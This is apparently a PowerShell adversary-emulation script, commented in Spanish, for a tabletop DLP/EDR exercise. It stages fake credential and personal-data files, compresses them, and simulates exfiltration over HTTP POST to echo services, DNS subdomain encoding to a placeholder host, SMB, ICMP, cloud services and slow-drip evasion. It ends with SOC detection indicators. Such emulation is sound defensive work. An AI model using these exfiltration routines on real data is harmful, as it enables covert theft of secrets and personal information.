# ============================================
# Script de Simulación: Exfiltración de Datos
# Propósito: Ejercicio Table Top - NO MALICIOSO
# Uso: SOLO en entornos de prueba autorizados
# ============================================

Write-Host "=== SIMULACIÓN DE EXFILTRACIÓN DE DATOS INICIADA ===" -ForegroundColor Yellow
Write-Host "Simulando técnicas de exfiltración para entrenamiento DLP/EDR" -ForegroundColor Cyan

# Configuración
$stagingPath = "$env:TEMP\DataStaging_$(Get-Date -Format 'yyyyMMddHHmmss')"
New-Item -ItemType Directory -Path $stagingPath -Force | Out-Null

Write-Host "[*] Directorio de staging creado: $stagingPath" -ForegroundColor Yellow

# 1. Recolección de Datos Sensibles (Simulados)
Write-Host "`n[+] Fase 1: Identificación y Recolección de Datos" -ForegroundColor Green

# Crear archivos simulados con nombres sospechosos
$fakeFiles = @{
    "passwords_export.txt" = "usuario1:password123`nusuario2:pass456`nadmin:admin2024"
    "database_backup.sql" = "SELECT * FROM users WHERE role='admin';`nSELECT * FROM payment_info;"
    "credentials.config" = "[Database]`nServer=localhost`nUser=sa`nPassword=P@ssw0rd"
    "employee_data.csv" = "Name,Email,SSN,Salary`nJohn Doe,john@company.com,123-45-6789,75000"
    "api_keys.json" = '{"aws_key":"AKIAIOSFODNN7EXAMPLE","secret":"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"}'
}

Write-Host "[*] Creando archivos simulados de datos sensibles..." -ForegroundColor Yellow

foreach ($fileName in $fakeFiles.Keys) {
    $filePath = Join-Path $stagingPath $fileName
    $fakeFiles[$fileName] | Out-File -FilePath $filePath -Encoding UTF8
    Write-Host "[+] Creado: $fileName" -ForegroundColor Green
}

# 2. Compresión de Datos (Técnica común de exfiltración)
Write-Host "`n[+] Fase 2: Compresión de Datos para Exfiltración" -ForegroundColor Green

$archiveName = "backup_$(Get-Date -Format 'yyyyMMdd').zip"
$archivePath = "$env:TEMP\$archiveName"

Write-Host "[*] Comprimiendo datos en: $archiveName" -ForegroundColor Yellow

try {
    Compress-Archive -Path "$stagingPath\*" -DestinationPath $archivePath -Force
    $archiveSize = (Get-Item $archivePath).Length
    Write-Host "[+] Archivo comprimido creado: $archivePath ($([math]::Round($archiveSize/1KB,2)) KB)" -ForegroundColor Green
} catch {
    Write-Host "[!] Error al comprimir archivos" -ForegroundColor Red
}

# 3. Simulación de Exfiltración via HTTP POST
Write-Host "`n[+] Fase 3: Exfiltración via HTTP POST" -ForegroundColor Green

$exfilUrls = @(
    "http://httpbin.org/post",
    "http://postman-echo.com/post"
)

foreach ($url in $exfilUrls) {
    try {
        Write-Host "[*] Intentando exfiltración a: $url" -ForegroundColor Yellow
        
        # Simular envío de datos
        $exfilData = @{
            hostname = $env:COMPUTERNAME
            user = $env:USERNAME
            data_size = $archiveSize
            timestamp = (Get-Date).ToString()
        }
        
        $jsonData = $exfilData | ConvertTo-Json
        
        $response = Invoke-RestMethod -Uri $url -Method POST -Body $jsonData -ContentType "application/json" -TimeoutSec 5 -ErrorAction SilentlyContinue
        Write-Host "[+] Datos enviados exitosamente" -ForegroundColor Green
    } catch {
        Write-Host "[!] Exfiltración falló (esperado en red aislada)" -ForegroundColor Red
    }
    Start-Sleep -Seconds 2
}

# 4. Simulación de Exfiltración via DNS
Write-Host "`n[+] Fase 4: Exfiltración via DNS Queries" -ForegroundColor Green

# Simular codificación de datos en subdominios
$dataToExfil = "SENSITIVE_DATA_123456"
$encodedData = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($dataToExfil))
$encodedData = $encodedData.Replace('=','').Replace('+','-').Replace('/','_')

# Dividir en chunks (DNS tiene límite de 63 caracteres por label)
$chunkSize = 32
for ($i = 0; $i -lt $encodedData.Length; $i += $chunkSize) {
    $chunk = $encodedData.Substring($i, [Math]::Min($chunkSize, $encodedData.Length - $i))
    $dnsDomain = "$chunk.exfil-test.example.com"
    
    try {
        Write-Host "[*] DNS Query exfiltración: $dnsDomain" -ForegroundColor Yellow
        Resolve-DnsName -Name $dnsDomain -ErrorAction SilentlyContinue | Out-Null
    } catch {
        Write-Host "[!] DNS query falló (esperado)" -ForegroundColor Red
    }
    Start-Sleep -Seconds 1
}

# 5. Simulación de Exfiltración via ICMP (Ping)
Write-Host "`n[+] Fase 5: Exfiltración via ICMP" -ForegroundColor Green

Write-Host "[*] Enviando pings con datos embebidos..." -ForegroundColor Yellow

try {
    # Crear buffer con patrón sospechoso
    $buffer = [System.Text.Encoding]::ASCII.GetBytes("EXFIL_DATA_" + (Get-Date -Format "HHmmss"))
    
    # Enviar múltiples pings
    for ($i = 1; $i -le 5; $i++) {
        $ping = Test-Connection -ComputerName "127.0.0.1" -Count 1 -BufferSize $buffer.Length -ErrorAction SilentlyContinue
        if ($ping) {
            Write-Host "[*] Ping $i enviado con $($buffer.Length) bytes" -ForegroundColor Yellow
        }
        Start-Sleep -Milliseconds 500
    }
} catch {
    Write-Host "[!] Error en exfiltración ICMP" -ForegroundColor Red
}

# 6. Simulación de Exfiltración via SMB
Write-Host "`n[+] Fase 6: Exfiltración via Protocolo SMB" -ForegroundColor Green

$smbPaths = @(
    "\\127.0.0.1\C$\temp",
    "\\localhost\share",
    "\\192.168.1.1\data"
)

foreach ($path in $smbPaths) {
    try {
        Write-Host "[*] Intentando copiar datos a: $path" -ForegroundColor Yellow
        # Solo probar acceso, no copiar realmente
        Test-Path $path -ErrorAction SilentlyContinue | Out-Null
        Write-Host "[!] Intento de acceso registrado" -ForegroundColor Yellow
    } catch {
        Write-Host "[!] Acceso denegado (esperado)" -ForegroundColor Red
    }
    Start-Sleep -Seconds 1
}

# 7. Simulación de Exfiltración Lenta (Slow Drip)
Write-Host "`n[+] Fase 7: Exfiltración Lenta para Evasión" -ForegroundColor Green

Write-Host "[*] Simulando transferencia gradual de datos..." -ForegroundColor Yellow

$totalChunks = 5
$chunkSize = 1024  # 1KB por chunk

for ($i = 1; $i -le $totalChunks; $i++) {
    # Simular lectura de chunk
    Write-Host "[*] Chunk $i/$totalChunks ($chunkSize bytes) - Timestamp: $(Get-Date -Format 'HH:mm:ss')" -ForegroundColor Yellow
    
    # Pausa entre chunks (evasión de DLP)
    $randomDelay = Get-Random -Minimum 10 -Maximum 20
    Start-Sleep -Seconds $randomDelay
}

# 8. Simulación de Uso de Servicios Cloud
Write-Host "`n[+] Fase 8: Exfiltración via Servicios Cloud Legítimos" -ForegroundColor Green

$cloudServices = @(
    "api.dropbox.com",
    "drive.google.com",
    "onedrive.live.com",
    "api.box.com"
)

foreach ($service in $cloudServices) {
    try {
        Write-Host "[*] Simulando conexión a: $service" -ForegroundColor Yellow
        Test-Connection -ComputerName $service -Count 1 -ErrorAction SilentlyContinue | Out-Null
    } catch {
        Write-Host "[!] Conexión no establecida" -ForegroundColor Red
    }
    Start-Sleep -Seconds 2
}

# 9. Codificación de Datos (Técnica de Ofuscación)
Write-Host "`n[+] Fase 9: Ofuscación de Datos Exfiltrados" -ForegroundColor Green

$sampleData = "Confidential Information - Do Not Share"
Write-Host "[*] Datos originales: $sampleData" -ForegroundColor Yellow

# Base64
$base64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($sampleData))
Write-Host "[*] Base64: $base64" -ForegroundColor Yellow

# Hex
$hexString = ($sampleData.ToCharArray() | ForEach-Object { [Convert]::ToString([int]$_, 16).PadLeft(2,'0') }) -join ''
Write-Host "[*] Hexadecimal: $hexString" -ForegroundColor Yellow

# 10. Resumen y Limpieza
Write-Host "`n[+] Fase 10: Registro de Actividad" -ForegroundColor Green

$summary = @"
=== RESUMEN DE ACTIVIDAD DE EXFILTRACIÓN ===
Timestamp: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
Equipo: $env:COMPUTERNAME
Usuario: $env:USERNAME
Archivos procesados: $($fakeFiles.Count)
Tamaño de archivo comprimido: $([math]::Round($archiveSize/1KB,2)) KB
Intentos de exfiltración: 8 métodos diferentes
===========================================
"@

Write-Host $summary -ForegroundColor Cyan

# Guardar log
$logPath = "$env:TEMP\exfil_log_$(Get-Date -Format 'yyyyMMddHHmmss').txt"
$summary | Out-File -FilePath $logPath

Write-Host "`n[*] Log guardado en: $logPath" -ForegroundColor Yellow

# Limpieza
Write-Host "`n[*] Limpiando archivos temporales..." -ForegroundColor Yellow
Start-Sleep -Seconds 2

if (Test-Path $stagingPath) {
    Remove-Item $stagingPath -Recurse -Force -ErrorAction SilentlyContinue
    Write-Host "[+] Directorio staging eliminado" -ForegroundColor Green
}

if (Test-Path $archivePath) {
    Remove-Item $archivePath -Force -ErrorAction SilentlyContinue
    Write-Host "[+] Archivo comprimido eliminado" -ForegroundColor Green
}

Write-Host "`n=== SIMULACIÓN DE EXFILTRACIÓN COMPLETADA ===" -ForegroundColor Green
Write-Host "[!] INDICADORES A BUSCAR EN SOC:" -ForegroundColor Magenta
Write-Host "  - Compresión de múltiples archivos sensibles" -ForegroundColor White
Write-Host "  - Conexiones salientes a servicios cloud" -ForegroundColor White
Write-Host "  - Queries DNS con subdominios sospechosos" -ForegroundColor White
Write-Host "  - Volumen inusual de datos en POST requests" -ForegroundColor White
Write-Host "  - Actividad en horarios no habituales" -ForegroundColor White
